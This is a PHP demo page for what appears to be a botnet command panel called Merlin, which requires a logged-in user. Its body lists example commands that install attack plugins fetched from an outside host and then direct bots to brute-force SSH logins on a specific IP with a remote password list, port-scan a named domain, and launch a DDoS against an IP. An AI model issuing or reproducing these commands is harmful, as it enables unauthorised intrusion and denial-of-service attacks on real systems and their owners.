<?php

require 'merlin/RedisFactory.php';
require 'merlin/Session.php';
require 'merlin/Logger.php';
require 'merlin/User.php';
require 'merlin/UserManager.php';
require 'merlin/Crane.php';

header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Cache-Control: post-check=0, pre-check=0", false);
header("Pragma: no-cache");

$CONTEXT = array(
	'title' => '::Merlin - Demo',
	'noLogo' => true,
	'basePath' => ''
);

$redis = \merlin\RedisFactory::getInstance();
$session = \merlin\Session::getInstance();
$logger = \merlin\Logger::getInstance();
$user = \merlin\UserManager::getLoggedUser();
$crane = \merlin\Crane::getInstance();

if($user==null){
	header('Location: login.php');
	$logger->error("Need to be logged in to list instances.");
	exit(0);
}



require $CONTEXT['basePath'] . 'src/template/head.php';
require $CONTEXT['basePath'] . 'src/template/menu.php';
require $CONTEXT['basePath'] . 'src/template/errors.php';
?>
<div class="center">
	<ul>
		<li>plugin_install http://gp.powertrip.pt/BruteForce.jar</li>
		<li>task_run bruteforce host:94.61.253.21 port:22 user:powertrip dict:http://94.61.253.21/passwords.txt bots:4</li>
		<li><hr></li>
		<li>plugin_install http://gp.powertrip.pt/PortScanner.jar</li>
		<li>task_run portscanner address:slimecraft.pt ports:1-200 bots:4</li>
		<li><hr></li>
		<li>plugin_install http://gp.powertrip.pt/ddos.jar</li>
		<li>task_run ddos address:94.61.253.21 port:2 bots:2 duration:40</li>

	</ul>
</div>

<script type="text/javascript" src="//code.jquery.com/jquery-1.11.3.min.js"></script>
<script type="text/javascript" src="//code.jquery.com/jquery-migrate-1.2.1.min.js"></script>
<script type="text/javascript" src="<?=$CONTEXT['basePath']?>src/js/list.js"></script>

<?php require $CONTEXT['basePath'] . 'src/template/bottom.php';?>
